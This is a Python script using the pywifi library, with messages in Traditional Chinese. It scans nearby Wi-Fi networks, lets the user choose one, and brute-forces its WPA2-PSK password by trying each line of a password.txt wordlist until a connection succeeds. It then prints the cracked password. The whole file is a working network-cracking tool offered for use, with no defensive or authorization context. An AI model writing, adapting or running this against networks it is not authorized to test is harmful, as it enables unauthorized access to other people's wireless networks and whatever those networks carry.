# -*- coding: utf-8 -*-
import time
from tqdm import tqdm
from pywifi import const, PyWiFi, Profile
from wcwidth import wcswidth

def get_card():
    wifi = PyWiFi()
    card = wifi.interfaces()[0]
    card.disconnect()
    time.sleep(1)  
    status = card.status()
    if status not in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
        print("網卡未處於斷開狀態")
        return False
    return card

def pad_string(s, width):
    pad_length = width - wcswidth(s)
    return s + ' ' * pad_length

def scan_wifi(card):
    print("開始掃描WIFI，請稍後...")
    card.scan()
    time.sleep(7)
    wifi_list = card.scan_results()
    ssid_set = set()
    unique_wifi_list = []
    print("\n掃描結果：")
    for profile in wifi_list:
        ssid = profile.ssid.encode('raw_unicode_escape').decode('utf-8')
        if ssid and ssid not in ssid_set:
            ssid_set.add(ssid)
            unique_wifi_list.append(profile)
            print(f"SSID: {pad_string(ssid, 20)} 訊號強度: {profile.signal:<5} MAC地址: {profile.bssid}")
    return unique_wifi_list

def crack_wifi(wifi_ssid, card, total_passwords):
    file_path = "password.txt"
    with open(file_path, "r", encoding='utf-8') as password_file:
        with tqdm(total=total_passwords, desc="破解進度") as pbar:
            for pwd in password_file:
                pwd = pwd.strip()
                if connect_to_wifi(pwd, wifi_ssid, card):
                    return pwd
                pbar.update(1)
                time.sleep(1)
    return None

def connect_to_wifi(pwd, wifi_ssid, card):
    profile = Profile()
    profile.ssid = wifi_ssid
    profile.key = pwd
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    
    card.remove_all_network_profiles()
    tmp_profile = card.add_network_profile(profile)
    card.connect(tmp_profile)
    #time.sleep(1)
    if card.status() == const.IFACE_CONNECTED:
        is_connected = True
    else:
        is_connected = False
    card.disconnect()
    time.sleep(1)
    return is_connected

card = get_card()
if not card:
    print("網卡關閉失敗，請重試!")
else:
    wifi_list = scan_wifi(card)
    if not wifi_list:
        print("掃描不到附近WIFI!")
    else:
        available_ssids = [profile.ssid.encode('raw_unicode_escape').decode('utf-8') for profile in wifi_list]
        target_wifi_ssid = input("\n請選擇要破解的WIFI（輸入SSID）: ")
        if target_wifi_ssid not in available_ssids:
            print("所選SSID不存在於掃描結果中。")
        else:
            total_passwords = sum(1 for line in open('password.txt', 'r', encoding='utf-8'))
            print("開始破解WIFI... SSID:", target_wifi_ssid)
            result = crack_wifi(target_wifi_ssid, card, total_passwords)
            if result:
                print("破解成功! WIFI密碼為:", result)
            else:
                print("破解失敗，未找到正確密碼")